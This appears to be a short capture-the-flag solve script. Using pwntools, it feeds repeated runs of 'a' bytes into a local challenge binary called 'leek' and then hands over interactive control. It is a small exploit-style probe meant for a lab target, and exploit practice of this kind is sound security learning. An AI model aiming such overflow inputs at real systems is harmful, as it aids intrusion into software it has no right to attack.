from pwn import *

elf = context.binary = ELF("./leek")
r = process()

for i in range(100):
    payload = b'a' * 64
    r.sendline(payload)
    payload = b'a' * 32
    r.sendline(payload)

r.interactive()
